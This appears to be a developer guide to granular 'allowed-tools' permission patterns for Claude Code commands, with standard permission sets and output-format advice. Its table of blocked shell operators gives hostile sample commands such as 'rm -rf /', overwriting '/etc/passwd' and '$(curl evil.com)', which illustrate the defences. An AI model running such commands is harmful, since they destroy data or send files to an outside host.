# Agentic Permissions

Commands and skills should use granular `allowed-tools` permissions to enable seamless, deterministic execution without interactive approval prompts.

## Permission Syntax

### Frontmatter Format

```yaml
allowed-tools: Bash(git status:*), Bash(gh pr:*), Read, TodoWrite
```

- Uses **colon separator** between command and pattern: `Bash(command:*)`
- **Prefix matching**: `Bash(git diff:*)` matches `git diff`, `git diff --cached`, `git diff --stat`
- Comma-separated list of tool permissions

### Pattern Examples

| Pattern | Matches |
|---------|---------|
| `Bash(git status:*)` | `git status`, `git status --porcelain`, `git status -s` |
| `Bash(gh pr:*)` | `gh pr view`, `gh pr checks`, `gh pr list --json` |
| `Bash(gh run:*)` | `gh run view`, `gh run list`, `gh run view --log-failed` |
| `Bash(npm run:*)` | `npm run test`, `npm run build`, `npm run lint` |

## Shell Operator Protections

Claude Code 2.1.7+ includes built-in protections against dangerous shell operators in permission patterns.

### Protected Operators

These operators are blocked by default when matched against permission patterns:

| Operator | Risk | Example |
|----------|------|---------|
| `&&` | Command chaining | `ls && rm -rf /` |
| `\|\|` | Conditional execution | `false \|\| malicious` |
| `;` | Command separation | `safe; dangerous` |
| `\|` | Pipe to other commands | `cat file \| curl` |
| `>` / `>>` | Output redirection | `echo bad > /etc/passwd` |
| `$()` | Command substitution | `$(curl evil.com)` |
| `` ` `` | Backtick substitution | `` `rm -rf /` `` |

### Security Behavior

When a Bash command contains shell operators:
1. The entire command is evaluated, not just the prefix
2. Permission patterns like `Bash(git:*)` won't match `git status && rm -rf`
3. Users see a clear warning about the blocked operator

### Safe Patterns

```yaml
# These are safe - single commands only
allowed-tools: Bash(git status:*), Bash(npm test:*), Bash(bun run:*)
```

### Bypass (Not Recommended)

For legitimate compound commands, request explicit user approval or use scripts:

```bash
# Instead of inline operators
#!/bin/bash
# safe-deploy.sh
npm test && npm run build && npm run deploy
```

Then grant permission to the script:
```yaml
allowed-tools: Bash(./scripts/safe-deploy.sh:*)
```

## Design Principles

### 1. Granular Over Broad

Prefer specific command patterns over broad tool access.

**Avoid:**
```yaml
allowed-tools: Bash, Read, Write
```

**Prefer:**
```yaml
allowed-tools: Bash(git status:*), Bash(git diff:*), Bash(git add:*), Read
```

### 2. Principle of Least Privilege

Only grant permissions needed for the command's purpose.

| Command Purpose | Appropriate Permissions |
|-----------------|------------------------|
| Read-only diagnostics | `Bash(git status:*), Bash(gh pr view:*), Read` |
| Commit workflow | Above + `Bash(git add:*), Bash(git commit:*)` |
| PR workflow | Above + `Bash(git push:*), Bash(gh pr create:*)` |

### 3. Deterministic Execution

Commands should run the same way every time. This means:
- Fixed command patterns in context sections
- JSON/porcelain output for machine parsing
- No ad-hoc piping that requires additional approval

## Standard Permission Sets

### Git Read-Only

```yaml
allowed-tools: Bash(git status:*), Bash(git diff:*), Bash(git log:*), Bash(git branch:*), Bash(git remote:*), Read, Grep, Glob
```

### Git Read-Write

```yaml
allowed-tools: Bash(git status:*), Bash(git diff:*), Bash(git log:*), Bash(git branch:*), Bash(git add:*), Bash(git commit:*), Bash(git restore:*), Read, Edit, Grep, Glob, TodoWrite
```

### Git + GitHub CLI

```yaml
allowed-tools: Bash(git status:*), Bash(git diff:*), Bash(git log:*), Bash(git add:*), Bash(git commit:*), Bash(git push:*), Bash(gh pr:*), Bash(gh run:*), Bash(gh issue:*), Read, Edit, Grep, Glob, TodoWrite
```

### CI/CD Diagnostics

```yaml
allowed-tools: Bash(gh pr checks:*), Bash(gh pr view:*), Bash(gh run view:*), Bash(gh run list:*), Bash(git status:*), Bash(git diff:*), Bash(git log:*), Read, Grep, Glob, TodoWrite
```

### Security Checks

```yaml
allowed-tools: Bash(detect-secrets:*), Bash(pre-commit:*), Bash(git status:*), Read, Grep, Glob, TodoWrite
```

## Machine-Readable Output

Commands should use output formats optimized for AI parsing.

### Git Commands

| Operation | Command |
|-----------|---------|
| Status | `git status --porcelain=v2 --branch` |
| Diff stats | `git diff --stat --numstat` |
| Log | `git log --format='%H %s' -n 10` |
| Branch info | `git branch -vv --format='%(refname:short) %(upstream:short) %(upstream:track)'` |

### GitHub CLI Commands

| Operation | Command |
|-----------|---------|
| PR checks | `gh pr checks $N --json name,state,conclusion,detailsUrl` |
| PR details | `gh pr view $N --json number,title,state,mergeable,statusCheckRollup` |
| Run details | `gh run view $ID --json conclusion,status,jobs,createdAt` |
| Failed logs | `gh run view $ID --log-failed` |
| Issue details | `gh issue view $N --json number,title,body,state,labels,assignees` |

## Project Settings Recommendation

For projects using plugins with these patterns, recommend adding to `.claude/settings.json`:

```json
{
  "permissions": {
    "allow": [
      "Bash(gh pr:*)",
      "Bash(gh run:*)",
      "Bash(gh issue:*)",
      "Bash(git status:*)",
      "Bash(git diff:*)",
      "Bash(git log:*)",
      "Bash(git add:*)",
      "Bash(git commit:*)",
      "Bash(git push:*)",
      "Bash(git branch:*)",
      "Bash(git remote:*)",
      "Bash(pre-commit:*)",
      "Bash(detect-secrets:*)"
    ]
  }
}
```

## Context Section Patterns

Use backtick expressions with JSON/porcelain output:

```markdown
## Context

- Git status: !`git status --porcelain=v2 --branch`
- PR checks: !`gh pr checks $PR_NUMBER --json name,state,conclusion 2>/dev/null || echo "[]"`
- Current branch: !`git branch --show-current`
```

Always include error fallback (`2>/dev/null || echo "..."`) to prevent context failures.

## Checklist for New Commands

- [ ] Uses granular `Bash(command:*)` patterns instead of broad `Bash`
- [ ] Context commands use JSON/porcelain output
- [ ] Context commands have error fallbacks
- [ ] Only necessary permissions are granted
- [ ] Matches a standard permission set or documents why custom set is needed
